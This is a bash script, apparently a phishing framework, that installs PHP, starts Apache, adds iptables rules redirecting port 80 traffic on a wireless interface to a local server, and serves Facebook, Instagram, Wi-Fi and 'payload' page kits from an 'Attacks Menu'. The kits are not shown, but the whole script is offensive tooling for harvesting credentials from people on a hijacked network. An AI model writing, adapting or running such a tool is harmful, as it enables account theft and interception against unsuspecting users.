#!/bin/bash

# Colors
nc="\e[0m"       # No color
green="\e[32m"   # Green
red="\e[31m"     # Red
yellow="\e[33m"  # Yellow
white="\e[97m"   # White

# Banner function
function display_banner {
  echo -e "$green"
  cat << "EOF"
           _ _  ___  ___  _    _      _             
          | | |/ __>| . \| |_ <_> ___| |_  ___  _ _ 
          |   |\__ \|  _/| . || |<_-<| . |/ ._>| '_>
          |_|_|<___/|_|  |_|_||_|/__/|_|_|\___.|_|  
EOF
  echo -e "$nc"
  echo -e "                 $yellow-+-$white Coded by:$red @HxRofo $yellow-+-\n $nc"
  sleep 5
}

# Function to execute initial setup commands
function execute_setup_commands {
  echo -e "\e[33mInstalling and Setting up Tools\e[0m"  # Yellow color for setup message

  # Update package lists and install php and unzip
  apt update
  apt install php unzip -y

  sleep 1

  # Get IP address
  IP=$(ifconfig wlan0 | grep 'inet' | cut -d: -f2 | awk '{print $2}')
  
  # Start Apache server
  service apache2 start > /dev/null 2>&1
  
  # Set iptables-legacy path
  iptables_legacy_path=$(which iptables-legacy) 
  update-alternatives --set iptables "$iptables_legacy_path" 

  # Set up iptables rules
  iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-port 8080
  iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to-destination $IP
  clear
  sleep 1
  echo -e "\e[1m\e[32mWe're Good to Go!\e[0m"  # Bold and green color for success message
  sleep 1
}

# Function to unzip the file to the corresponding directory and start the PHP server
function unzip_file {
  local filename=$1

  case $filename in
    facebook.zip)
      target_dir="facebook"
      ;;
    instagram.zip)
      target_dir="instagram"
      ;;
    wifi.zip)
      target_dir="wifi"
      ;;
    payload.zip)
      target_dir="payload"
      ;;
    *)
      echo "Invalid filename. Cannot determine the corresponding directory."
      return
      ;;
  esac

  # Check if the file exists
  if [[ ! -f "$filename" ]]; then
    echo "File '$filename' not found."
    return
  fi

  # Kill the process running on port 8080 if it exists
  local php_pid=$(lsof -ti :8080)
  if [[ -n "$php_pid" ]]; then
    echo "Killing PHP server process (PID: $php_pid)..."
    kill "$php_pid"
  fi

  # Unzip the file to /var/www/html/
  sudo unzip -o -qq "$filename" -d "/var/www/html/"
  echo "File '$filename' unzipped successfully to /var/www/html/ directory."

  # Execute the PHP server from the current working directory
  cd "$(dirname "$0")"
  php -S 0.0.0.0:8080 -t "/var/www/html/$target_dir" &
  php_pid=$!
  echo "PHP server started on port 8080 with document root '$target_dir' (PID: $php_pid)."
  sleep 2
}

# Main menu function
function main_menu {
  clear

  # Display the banner and menu at the same time
  display_banner

  echo -e "\n\e[1m\e[32mAttacks Menu\e[0m\n"  # Bold and green color for "Attacks Menu"
  echo -e "\e[1m\e[31m[1]\e[0m \e[1mFacebook\e[0m"
  echo -e "\e[1m\e[31m[2]\e[0m \e[1mInstagram\e[0m"
  echo -e "\e[1m\e[31m[3]\e[0m \e[1mWifi\e[0m"
  echo -e "\e[1m\e[31m[4]\e[0m \e[1mPayload\e[0m"
  echo -e "\e[1m\e[31m[5]\e[0m \e[1mExit\e[0m"

  read -p "Enter your choice: " choice
  case $choice in
    1)
      unzip_file "facebook.zip"
      ;;
    2)
      unzip_file "instagram.zip"
      ;;
    3)
      unzip_file "wifi.zip"
      ;;
    4)
      unzip_file "payload.zip"
      ;;
    5)
      exit_with_cleanup 0
      ;;
    *)
      echo "Invalid choice. Please try again."
      ;;
  esac

  if [[ $choice != 5 ]]; then
    read -p "Press enter to continue."
    main_menu
  fi
}

# Function to exit the script and perform cleanup
function exit_with_cleanup {
  local exit_code=$1

  # Flush and clear iptables
  echo -e "\e[1m\e[32mBye Bye!\e[0m"
  service apache2 stop > /dev/null 2>&1
  iptables -t nat -F
  kill $php_pid > /dev/null 2>&1
  exit $exit_code
}

# Start the script
execute_setup_commands
main_menu
